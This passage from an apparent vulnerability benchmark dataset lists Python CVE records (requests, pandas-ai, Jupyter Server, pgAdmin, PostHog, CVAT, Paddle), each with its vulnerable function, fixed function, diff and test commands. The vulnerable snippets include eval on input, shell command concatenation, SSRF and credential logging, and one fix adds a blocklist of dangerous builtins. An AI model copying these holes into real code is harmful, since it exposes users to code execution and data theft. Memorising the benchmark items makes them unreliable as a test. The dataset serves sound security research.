        "snippet": "def parse_env_variables(cls: Type[\"pl.Trainer\"], template: str = \"PL_%(cls_name)s_%(cls_argument)s\") -> Namespace:\n    \"\"\"Parse environment arguments if they are defined.\n\n    Examples:\n\n        >>> from pytorch_lightning import Trainer\n        >>> parse_env_variables(Trainer)\n        Namespace()\n        >>> import os\n        >>> os.environ[\"PL_TRAINER_GPUS\"] = '42'\n        >>> os.environ[\"PL_TRAINER_BLABLABLA\"] = '1.23'\n        >>> parse_env_variables(Trainer)\n        Namespace(gpus=42)\n        >>> del os.environ[\"PL_TRAINER_GPUS\"]\n    \"\"\"\n    cls_arg_defaults = get_init_arguments_and_types(cls)\n\n    env_args = {}\n    for arg_name, _, _ in cls_arg_defaults:\n        env = template % {\"cls_name\": cls.__name__.upper(), \"cls_argument\": arg_name.upper()}\n        val = os.environ.get(env)\n        if not (val is None or val == \"\"):\n            # todo: specify the possible exception\n            with suppress(Exception):\n                # converting to native types like int/float/bool\n                val = eval(val)\n            env_args[arg_name] = val\n    return Namespace(**env_args)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_102_1",
        "commit": "8b7a12c",
        "file_path": "pytorch_lightning/utilities/argparse.py",
        "start_line": "100",
        "end_line": "127",
        "snippet": "def parse_env_variables(cls: Type[\"pl.Trainer\"], template: str = \"PL_%(cls_name)s_%(cls_argument)s\") -> Namespace:\n    \"\"\"Parse environment arguments if they are defined.\n\n    Examples:\n\n        >>> from pytorch_lightning import Trainer\n        >>> parse_env_variables(Trainer)\n        Namespace()\n        >>> import os\n        >>> os.environ[\"PL_TRAINER_GPUS\"] = '42'\n        >>> os.environ[\"PL_TRAINER_BLABLABLA\"] = '1.23'\n        >>> parse_env_variables(Trainer)\n        Namespace(gpus=42)\n        >>> del os.environ[\"PL_TRAINER_GPUS\"]\n    \"\"\"\n    cls_arg_defaults = get_init_arguments_and_types(cls)\n\n    env_args = {}\n    for arg_name, _, _ in cls_arg_defaults:\n        env = template % {\"cls_name\": cls.__name__.upper(), \"cls_argument\": arg_name.upper()}\n        val = os.environ.get(env)\n        if not (val is None or val == \"\"):\n            # todo: specify the possible exception\n            with suppress(Exception):\n                # converting to native types like int/float/bool\n                val = literal_eval(val)\n            env_args[arg_name] = val\n    return Namespace(**env_args)"
      }
    ],
    "vul_patch": "--- a/pytorch_lightning/utilities/argparse.py\n+++ b/pytorch_lightning/utilities/argparse.py\n@@ -23,6 +23,6 @@\n             # todo: specify the possible exception\n             with suppress(Exception):\n                 # converting to native types like int/float/bool\n-                val = eval(val)\n+                val = literal_eval(val)\n             env_args[arg_name] = val\n     return Namespace(**env_args)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-18074",
    "cve_description": "The Requests package before 2.20.0 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.",
    "cwe_info": {
      "CWE-522": {
        "name": "Insufficiently Protected Credentials",
        "description": "The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval."
      }
    },
    "repo": "https://github.com/requests/requests",
    "patch_url": [
      "https://github.com/requests/requests/commit/c45d7c49ea75133e52ab22a8e9e13173938e36ff"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_38_1",
        "commit": "dd754d1",
        "file_path": "requests/sessions.py",
        "start_line": 231,
        "end_line": 253,
        "snippet": "    def rebuild_auth(self, prepared_request, response):\n        \"\"\"When being redirected we may want to strip authentication from the\n        request to avoid leaking credentials. This method intelligently removes\n        and reapplies authentication where possible to avoid credential loss.\n        \"\"\"\n        headers = prepared_request.headers\n        url = prepared_request.url\n\n        if 'Authorization' in headers:\n            # If we get redirected to a new host, we should strip out any\n            # authentication headers.\n            original_parsed = urlparse(response.request.url)\n            redirect_parsed = urlparse(url)\n\n            if (original_parsed.hostname != redirect_parsed.hostname):\n                del headers['Authorization']\n\n        # .netrc might have more auth for us on our new host.\n        new_auth = get_netrc_auth(url) if self.trust_env else None\n        if new_auth is not None:\n            prepared_request.prepare_auth(new_auth)\n\n        return"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_38_1",
        "commit": "c45d7c49ea75133e52ab22a8e9e13173938e36ff",
        "file_path": "requests/sessions.py",
        "start_line": 247,
        "end_line": 265,
        "snippet": "    def rebuild_auth(self, prepared_request, response):\n        \"\"\"When being redirected we may want to strip authentication from the\n        request to avoid leaking credentials. This method intelligently removes\n        and reapplies authentication where possible to avoid credential loss.\n        \"\"\"\n        headers = prepared_request.headers\n        url = prepared_request.url\n\n        if 'Authorization' in headers and self.should_strip_auth(response.request.url, url):\n            # If we get redirected to a new host, we should strip out any\n            # authentication headers.\n            del headers['Authorization']\n\n        # .netrc might have more auth for us on our new host.\n        new_auth = get_netrc_auth(url) if self.trust_env else None\n        if new_auth is not None:\n            prepared_request.prepare_auth(new_auth)\n\n        return"
      },
      {
        "id": "fix_py_38_2",
        "commit": "c45d7c49ea75133e52ab22a8e9e13173938e36ff",
        "file_path": "requests/sessions.py",
        "start_line": 118,
        "end_line": 133,
        "snippet": "    def should_strip_auth(self, old_url, new_url):\n        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n        # breaking backwards compatibility with older versions of requests\n        # that allowed any redirects on the same host.\n        if (old_parsed.scheme == 'http' and old_parsed.port in (80, None)\n                and new_parsed.scheme == 'https' and new_parsed.port in (443, None)):\n            return False\n        # Standard case: root URI must match\n        return old_parsed.port != new_parsed.port or old_parsed.scheme != new_parsed.scheme\n"
      }
    ],
    "vul_patch": "--- a/requests/sessions.py\n+++ b/requests/sessions.py\n@@ -6,14 +6,10 @@\n         headers = prepared_request.headers\n         url = prepared_request.url\n \n-        if 'Authorization' in headers:\n+        if 'Authorization' in headers and self.should_strip_auth(response.request.url, url):\n             # If we get redirected to a new host, we should strip out any\n             # authentication headers.\n-            original_parsed = urlparse(response.request.url)\n-            redirect_parsed = urlparse(url)\n-\n-            if (original_parsed.hostname != redirect_parsed.hostname):\n-                del headers['Authorization']\n+            del headers['Authorization']\n \n         # .netrc might have more auth for us on our new host.\n         new_auth = get_netrc_auth(url) if self.trust_env else None\n\n--- /dev/null\n+++ b/requests/sessions.py\n@@ -0,0 +1,15 @@\n+    def should_strip_auth(self, old_url, new_url):\n+        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n+        old_parsed = urlparse(old_url)\n+        new_parsed = urlparse(new_url)\n+        if old_parsed.hostname != new_parsed.hostname:\n+            return True\n+        # Special case: allow http -> https redirect when using the standard\n+        # ports. This isn't specified by RFC 7235, but is kept to avoid\n+        # breaking backwards compatibility with older versions of requests\n+        # that allowed any redirects on the same host.\n+        if (old_parsed.scheme == 'http' and old_parsed.port in (80, None)\n+                and new_parsed.scheme == 'https' and new_parsed.port in (443, None)):\n+            return False\n+        # Standard case: root URI must match\n+        return old_parsed.port != new_parsed.port or old_parsed.scheme != new_parsed.scheme\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2018-18074:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/requests\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2018-18074/bin/python -m pytest tests/test_requests.py::TestRequests::test_auth_is_retained_for_redirect_on_host  tests/test_requests.py::TestRequests::test_should_strip_auth_http_downgrade tests/test_requests.py::TestRequests::test_should_strip_auth_https_upgrade tests/test_requests.py::TestRequests::test_should_strip_auth_port_change\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2018-18074:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/requests\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2018-18074/bin/python -m pytest tests/test_requests.py -k \"not test_conflicting_post_params and not test_pyopenssl_redirect and not test_https_warnings and not test_connect_timeout and not test_total_timeout_connect\"\n\n"
  },
  {
    "cve_id": "CVE-2023-39660",
    "cve_description": "An issue in Gaberiele Venturi pandasai v.0.8.0 and before allows a remote attacker to execute arbitrary code via a crafted request to the prompt function.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/gventuri/pandas-ai",
    "patch_url": [
      "https://github.com/gventuri/pandas-ai/commit/3aac79be8fc1d18b53d66a566adddbbdd2b38ad5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_60_1",
        "commit": "b452b3b",
        "file_path": "pandasai/__init__.py",
        "start_line": 589,
        "end_line": 616,
        "snippet": "    def _clean_code(self, code: str) -> str:\n        \"\"\"\n        A method to clean the code to prevent malicious code execution\n\n        Args:\n            code(str): A python code\n\n        Returns (str): Returns a Clean Code String\n\n        \"\"\"\n\n        tree = ast.parse(code)\n\n        new_body = []\n\n        # clear recent optional dependencies\n        self._additional_dependencies = []\n\n        for node in tree.body:\n            if isinstance(node, (ast.Import, ast.ImportFrom)):\n                self._check_imports(node)\n                continue\n            if self._is_df_overwrite(node):\n                continue\n            new_body.append(node)\n\n        new_tree = ast.Module(body=new_body)\n        return astor.to_source(new_tree, pretty_source=lambda x: \"\".join(x)).strip()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_60_1",
        "commit": "3aac79be8fc1d18b53d66a566adddbbdd2b38ad5",
        "file_path": "pandasai/__init__.py",
        "start_line": 607,
        "end_line": 634,
        "snippet": "    def _clean_code(self, code: str) -> str:\n        \"\"\"\n        A method to clean the code to prevent malicious code execution\n\n        Args:\n            code(str): A python code\n\n        Returns (str): Returns a Clean Code String\n\n        \"\"\"\n\n        tree = ast.parse(code)\n\n        new_body = []\n\n        # clear recent optional dependencies\n        self._additional_dependencies = []\n\n        for node in tree.body:\n            if isinstance(node, (ast.Import, ast.ImportFrom)):\n                self._check_imports(node)\n                continue\n            if self._is_df_overwrite(node) or self._is_jailbreak(node):\n                continue\n            new_body.append(node)\n\n        new_tree = ast.Module(body=new_body)\n        return astor.to_source(new_tree, pretty_source=lambda x: \"\".join(x)).strip()"
      },
      {
        "id": "fix_py_60_2",
        "commit": "3aac79be8fc1d18b53d66a566adddbbdd2b38ad5",
        "file_path": "pandasai/__init__.py",
        "start_line": 589,
        "end_line": 606,
        "snippet": "    def _is_jailbreak(self, node: ast.stmt) -> bool:\n        \"\"\"\n        Remove jailbreaks from the code to prevent malicious code execution.\n\n        Args:\n            node (object): ast.stmt\n\n        Returns (bool):\n        \"\"\"\n\n        DANGEROUS_BUILTINS = [\"__subclasses__\", \"__builtins__\", \"__import__\"]\n\n        for child in ast.walk(node):\n            if isinstance(child, ast.Name) and child.id in DANGEROUS_BUILTINS:\n                return True\n\n        return False\n"
      }
    ],
    "vul_patch": "--- a/pandasai/__init__.py\n+++ b/pandasai/__init__.py\n@@ -20,7 +20,7 @@\n             if isinstance(node, (ast.Import, ast.ImportFrom)):\n                 self._check_imports(node)\n                 continue\n-            if self._is_df_overwrite(node):\n+            if self._is_df_overwrite(node) or self._is_jailbreak(node):\n                 continue\n             new_body.append(node)\n \n\n--- /dev/null\n+++ b/pandasai/__init__.py\n@@ -0,0 +1,17 @@\n+    def _is_jailbreak(self, node: ast.stmt) -> bool:\n+        \"\"\"\n+        Remove jailbreaks from the code to prevent malicious code execution.\n+\n+        Args:\n+            node (object): ast.stmt\n+\n+        Returns (bool):\n+        \"\"\"\n+\n+        DANGEROUS_BUILTINS = [\"__subclasses__\", \"__builtins__\", \"__import__\"]\n+\n+        for child in ast.walk(node):\n+            if isinstance(child, ast.Name) and child.id in DANGEROUS_BUILTINS:\n+                return True\n+\n+        return False\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-39660:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/pandas-ai\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-39660/bin/python -m pytest tests/test_pandasai.py::TestPandasAI::test_clean_code_removes_jailbreak_code -p no:warning --disable-warnings \n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-39660:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/pandas-ai\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-39660/bin/python -m pytest tests/test_pandasai.py -p no:warning --disable-warnings \n"
  },
  {
    "cve_id": "CVE-2022-24757",
    "cve_description": "The Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications. Prior to version 1.15.4, unauthorized actors can access sensitive information from server logs. Anytime a 5xx error is triggered, the auth cookie and other header values are recorded in Jupyter Server logs by default. Considering these logs do not require root access, an attacker can monitor these logs, steal sensitive auth/cookie information, and gain access to the Jupyter server. Jupyter Server version 1.15.4 contains a patch for this issue. There are currently no known workarounds.",
    "cwe_info": {
      "CWE-532": {
        "name": "Insertion of Sensitive Information into Log File",
        "description": "The product writes sensitive information to a log file."
      }
    },
    "repo": "https://github.com/jupyter-server/jupyter_server",
    "patch_url": [
      "https://github.com/jupyter-server/jupyter_server/commit/a5683aca0b0e412672ac6218d09f74d44ca0de5a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_80_1",
        "commit": "e4a3141",
        "file_path": "jupyter_server/log.py",
        "start_line": "14",
        "end_line": "56",
        "snippet": "def log_request(handler):\n    \"\"\"log a bit more information about each request than tornado's default\n\n    - move static file get success to debug-level (reduces noise)\n    - get proxied IP instead of proxy IP\n    - log referer for redirect and failed requests\n    - log user-agent for failed requests\n    \"\"\"\n    status = handler.get_status()\n    request = handler.request\n    try:\n        logger = handler.log\n    except AttributeError:\n        logger = access_log\n\n    if status < 300 or status == 304:\n        # Successes (or 304 FOUND) are debug-level\n        log_method = logger.debug\n    elif status < 400:\n        log_method = logger.info\n    elif status < 500:\n        log_method = logger.warning\n    else:\n        log_method = logger.error\n\n    request_time = 1000.0 * handler.request.request_time()\n    ns = dict(\n        status=status,\n        method=request.method,\n        ip=request.remote_ip,\n        uri=request.uri,\n        request_time=request_time,\n    )\n    msg = \"{status} {method} {uri} ({ip}) {request_time:.2f}ms\"\n    if status >= 400:\n        # log bad referers\n        ns[\"referer\"] = request.headers.get(\"Referer\", \"None\")\n        msg = msg + \" referer={referer}\"\n    if status >= 500 and status != 502:\n        # log all headers if it caused an error\n        log_method(json.dumps(dict(request.headers), indent=2))\n    log_method(msg.format(**ns))\n    prometheus_log_method(handler)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_80_1",
        "commit": "a5683ac",
        "file_path": "jupyter_server/log.py",
        "start_line": "14",
        "end_line": "60",
        "snippet": "def log_request(handler):\n    \"\"\"log a bit more information about each request than tornado's default\n\n    - move static file get success to debug-level (reduces noise)\n    - get proxied IP instead of proxy IP\n    - log referer for redirect and failed requests\n    - log user-agent for failed requests\n    \"\"\"\n    status = handler.get_status()\n    request = handler.request\n    try:\n        logger = handler.log\n    except AttributeError:\n        logger = access_log\n\n    if status < 300 or status == 304:\n        # Successes (or 304 FOUND) are debug-level\n        log_method = logger.debug\n    elif status < 400:\n        log_method = logger.info\n    elif status < 500:\n        log_method = logger.warning\n    else:\n        log_method = logger.error\n\n    request_time = 1000.0 * handler.request.request_time()\n    ns = dict(\n        status=status,\n        method=request.method,\n        ip=request.remote_ip,\n        uri=request.uri,\n        request_time=request_time,\n    )\n    msg = \"{status} {method} {uri} ({ip}) {request_time:.2f}ms\"\n    if status >= 400:\n        # log bad referers\n        ns[\"referer\"] = request.headers.get(\"Referer\", \"None\")\n        msg = msg + \" referer={referer}\"\n    if status >= 500 and status != 502:\n        # Log a subset of the headers if it caused an error.\n        headers = {}\n        for header in ['Host', 'Accept', 'Referer', 'User-Agent']:\n            if header in request.headers:\n                headers[header] = request.headers[header]\n        log_method(json.dumps(headers, indent=2))\n    log_method(msg.format(**ns))\n    prometheus_log_method(handler)"
      }
    ],
    "vul_patch": "--- a/jupyter_server/log.py\n+++ b/jupyter_server/log.py\n@@ -37,7 +37,11 @@\n         ns[\"referer\"] = request.headers.get(\"Referer\", \"None\")\n         msg = msg + \" referer={referer}\"\n     if status >= 500 and status != 502:\n-        # log all headers if it caused an error\n-        log_method(json.dumps(dict(request.headers), indent=2))\n+        # Log a subset of the headers if it caused an error.\n+        headers = {}\n+        for header in ['Host', 'Accept', 'Referer', 'User-Agent']:\n+            if header in request.headers:\n+                headers[header] = request.headers[header]\n+        log_method(json.dumps(headers, indent=2))\n     log_method(msg.format(**ns))\n     prometheus_log_method(handler)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0959",
    "cve_description": "A malicious, but authorised and authenticated user can construct an HTTP request using their existing CSRF token and session cookie to manually upload files to any location that the operating system user account under which pgAdmin is running has permission to write.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/pgadmin-org/pgadmin4",
    "patch_url": [
      "https://github.com/pgadmin-org/pgadmin4/commit/dccd4f0bbaafa783d9f0360c7592b128d5cc3928"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_350_1",
        "commit": "99c6b171e4578f2ecb04925719c677142d51e551",
        "file_path": "web/pgadmin/misc/file_manager/__init__.py",
        "start_line": 967,
        "end_line": 1018,
        "snippet": "    def add(self, req=None):\n        \"\"\"\n        File upload functionality\n        \"\"\"\n        if not self.validate_request('upload'):\n            return self.ERROR_NOT_ALLOWED\n\n        the_dir = self.dir if self.dir is not None else ''\n        err_msg = ''\n        code = 1\n        try:\n            path = req.form.get('currentpath')\n\n            file_obj = req.files['newfile']\n            file_name = file_obj.filename\n            orig_path = \"{0}{1}\".format(the_dir, path)\n            new_name = \"{0}{1}\".format(orig_path, file_name)\n\n            try:\n                # Check if the new file is inside the users directory\n                if config.SERVER_MODE:\n                    pathlib.Path(new_name).relative_to(the_dir)\n            except ValueError:\n                return self.ERROR_NOT_ALLOWED\n\n            with open(new_name, 'wb') as f:\n                while True:\n                    # 4MB chunk (4 * 1024 * 1024 Bytes)\n                    data = file_obj.read(4194304)\n                    if not data:\n                        break\n                    f.write(data)\n        except Exception as e:\n            code = 0\n            err_msg = str(e.strerror) if hasattr(e, 'strerror') else str(e)\n\n        try:\n            Filemanager.check_access_permission(the_dir, path)\n        except Exception as e:\n            res = {\n                'Error': str(e),\n                'Code': 0\n            }\n            return res\n\n        result = {\n            'Path': path,\n            'Name': new_name,\n            'Error': err_msg,\n            'Code': code\n        }\n        return result"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_350_1",
        "commit": "dccd4f0bbaafa783d9f0360c7592b128d5cc3928",
        "file_path": "web/pgadmin/misc/file_manager/__init__.py",
        "start_line": 967,
        "end_line": 1022,
        "snippet": "    def add(self, req=None):\n        \"\"\"\n        File upload functionality\n        \"\"\"\n        if not self.validate_request('upload'):\n            return self.ERROR_NOT_ALLOWED\n\n        the_dir = self.dir if self.dir is not None else ''\n        err_msg = ''\n        code = 1\n        try:\n            path = req.form.get('currentpath')\n\n            file_obj = req.files['newfile']\n            file_name = file_obj.filename\n            orig_path = \"{0}{1}\".format(the_dir, path)\n            new_name = \"{0}{1}\".format(orig_path, file_name)\n\n            try:\n                # Check if the new file is inside the users directory\n                if config.SERVER_MODE:\n                    pathlib.Path(\n                        os.path.abspath(\n                            os.path.join(the_dir, new_name)\n                        )\n                    ).relative_to(the_dir)\n            except ValueError:\n                return self.ERROR_NOT_ALLOWED\n\n            with open(new_name, 'wb') as f:\n                while True:\n                    # 4MB chunk (4 * 1024 * 1024 Bytes)\n                    data = file_obj.read(4194304)\n                    if not data:\n                        break\n                    f.write(data)\n        except Exception as e:\n            code = 0\n            err_msg = str(e.strerror) if hasattr(e, 'strerror') else str(e)\n\n        try:\n            Filemanager.check_access_permission(the_dir, path)\n        except Exception as e:\n            res = {\n                'Error': str(e),\n                'Code': 0\n            }\n            return res\n\n        result = {\n            'Path': path,\n            'Name': new_name,\n            'Error': err_msg,\n            'Code': code\n        }\n        return result"
      }
    ],
    "vul_patch": "--- a/web/pgadmin/misc/file_manager/__init__.py\n+++ b/web/pgadmin/misc/file_manager/__init__.py\n@@ -19,7 +19,11 @@\n             try:\n                 # Check if the new file is inside the users directory\n                 if config.SERVER_MODE:\n-                    pathlib.Path(new_name).relative_to(the_dir)\n+                    pathlib.Path(\n+                        os.path.abspath(\n+                            os.path.join(the_dir, new_name)\n+                        )\n+                    ).relative_to(the_dir)\n             except ValueError:\n                 return self.ERROR_NOT_ALLOWED\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-46746",
    "cve_description": "PostHog provides open-source product analytics, session recording, feature flagging and A/B testing that you can self-host. A server-side request forgery (SSRF), which can only be exploited by authenticated users, was found in Posthog. Posthog did not verify whether a URL was local when enabling webhooks, allowing authenticated users to forge a POST request. This vulnerability has been addressed in `22bd5942` and will be included in subsequent releases. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/PostHog/posthog",
    "patch_url": [
      "https://github.com/PostHog/posthog/commit/22bd5942638d5d9bc4bd603a9bfe8f8a95572292"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_142_1",
        "commit": "948042d",
        "file_path": "posthog/api/user.py",
        "start_line": 460,
        "end_line": 482,
        "snippet": "def test_slack_webhook(request):\n    \"\"\"Test webhook.\"\"\"\n    try:\n        body = json.loads(request.body)\n    except (TypeError, json.decoder.JSONDecodeError):\n        return JsonResponse({\"error\": \"Cannot parse request body\"}, status=400)\n\n    webhook = body.get(\"webhook\")\n\n    if not webhook:\n        return JsonResponse({\"error\": \"no webhook URL\"})\n    message = {\"text\": \"_Greetings_ from PostHog!\"}\n    try:\n        if is_cloud():  # Protect against SSRF\n            raise_if_user_provided_url_unsafe(webhook)\n        response = requests.post(webhook, verify=False, json=message)\n\n        if response.ok:\n            return JsonResponse({\"success\": True})\n        else:\n            return JsonResponse({\"error\": response.text})\n    except:\n        return JsonResponse({\"error\": \"invalid webhook URL\"})"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_142_1",
        "commit": "22bd594",
        "file_path": "posthog/api/user.py",
        "start_line": 459,
        "end_line": 481,
        "snippet": "def test_slack_webhook(request):\n    \"\"\"Test webhook.\"\"\"\n    try:\n        body = json.loads(request.body)\n    except (TypeError, json.decoder.JSONDecodeError):\n        return JsonResponse({\"error\": \"Cannot parse request body\"}, status=400)\n\n    webhook = body.get(\"webhook\")\n\n    if not webhook:\n        return JsonResponse({\"error\": \"no webhook URL\"})\n    message = {\"text\": \"_Greetings_ from PostHog!\"}\n    try:\n        if not settings.DEBUG:\n            raise_if_user_provided_url_unsafe(webhook)\n        response = requests.post(webhook, verify=False, json=message)\n\n        if response.ok:\n            return JsonResponse({\"success\": True})\n        else:\n            return JsonResponse({\"error\": response.text})\n    except:\n        return JsonResponse({\"error\": \"invalid webhook URL\"})"
      }
    ],
    "vul_patch": "--- a/posthog/api/user.py\n+++ b/posthog/api/user.py\n@@ -11,7 +11,7 @@\n         return JsonResponse({\"error\": \"no webhook URL\"})\n     message = {\"text\": \"_Greetings_ from PostHog!\"}\n     try:\n-        if is_cloud():  # Protect against SSRF\n+        if not settings.DEBUG:\n             raise_if_user_provided_url_unsafe(webhook)\n         response = requests.post(webhook, verify=False, json=message)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31188",
    "cve_description": "CVAT is an opensource interactive video and image annotation tool for computer vision. Versions prior to 2.0.0 were found to be subject to a Server-side request forgery (SSRF) vulnerability. Validation has been added to urls used in the affected code path in version 2.0.0. Users are advised to upgrade. There are no known workarounds for this issue.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/cvat-ai/cvat",
    "patch_url": [
      "https://github.com/cvat-ai/cvat/commit/6fad1764efd922d99dbcda28c4ee72d071aa5a07"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_399_1",
        "commit": "a3bc6ed2a0a7564950e95701825be260cde1a9b5",
        "file_path": "cvat/apps/engine/task.py",
        "start_line": 206,
        "end_line": 227,
        "snippet": "def _download_data(urls, upload_dir):\n    job = rq.get_current_job()\n    local_files = {}\n    for url in urls:\n        name = os.path.basename(urlrequest.url2pathname(urlparse.urlparse(url).path))\n        if name in local_files:\n            raise Exception(\"filename collision: {}\".format(name))\n        slogger.glob.info(\"Downloading: {}\".format(url))\n        job.meta['status'] = '{} is being downloaded..'.format(url)\n        job.save_meta()\n\n        response = requests.get(url, stream=True)\n        if response.status_code == 200:\n            response.raw.decode_content = True\n            with open(os.path.join(upload_dir, name), 'wb') as output_file:\n                shutil.copyfileobj(response.raw, output_file)\n        else:\n            raise Exception(\"Failed to download \" + url)\n\n        local_files[name] = True\n\n    return list(local_files.keys())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_399_1",
        "commit": "6fad1764efd922d99dbcda28c4ee72d071aa5a07",
        "file_path": "cvat/apps/engine/task.py",
        "start_line": 248,
        "end_line": 270,
        "snippet": "def _download_data(urls, upload_dir):\n    job = rq.get_current_job()\n    local_files = {}\n    for url in urls:\n        name = os.path.basename(urlrequest.url2pathname(urlparse.urlparse(url).path))\n        if name in local_files:\n            raise Exception(\"filename collision: {}\".format(name))\n        _validate_url(url)\n        slogger.glob.info(\"Downloading: {}\".format(url))\n        job.meta['status'] = '{} is being downloaded..'.format(url)\n        job.save_meta()\n\n        response = requests.get(url, stream=True)\n        if response.status_code == 200:\n            response.raw.decode_content = True\n            with open(os.path.join(upload_dir, name), 'wb') as output_file:\n                shutil.copyfileobj(response.raw, output_file)\n        else:\n            raise Exception(\"Failed to download \" + url)\n\n        local_files[name] = True\n\n    return list(local_files.keys())"
      }
    ],
    "vul_patch": "--- a/cvat/apps/engine/task.py\n+++ b/cvat/apps/engine/task.py\n@@ -5,6 +5,7 @@\n         name = os.path.basename(urlrequest.url2pathname(urlparse.urlparse(url).path))\n         if name in local_files:\n             raise Exception(\"filename collision: {}\".format(name))\n+        _validate_url(url)\n         slogger.glob.info(\"Downloading: {}\".format(url))\n         job.meta['status'] = '{} is being downloaded..'.format(url)\n         job.save_meta()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-0817",
    "cve_description": "Command injection in IrGraph.draw in paddlepaddle/paddle 2.6.0",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/PaddlePaddle/Paddle",
    "patch_url": [
      "https://github.com/PaddlePaddle/Paddle/commit/bdf6234fdc22e6ee7948950d271cbbe1d27edc93"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_121_1",
        "commit": "98c5d5a",
        "file_path": "python/paddle/base/framework.py",
        "start_line": 5655,
        "end_line": 5663,
        "snippet": "        def _convert_to_pdf(dot_file_path):\n            pdf_save_path = os.path.splitext(dot_file_path)[0] + '.pdf'\n            exited_code = subprocess.call(\n                'dot -Tpdf ' + dot_file_path + ' -o ' + pdf_save_path,\n                shell=True,\n            )\n            if exited_code != 0:\n                print('The dot command is needed for creating pdf files.')\n                print(f'The {dot_file_path} is saved as the dot filetype.')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_121_1",
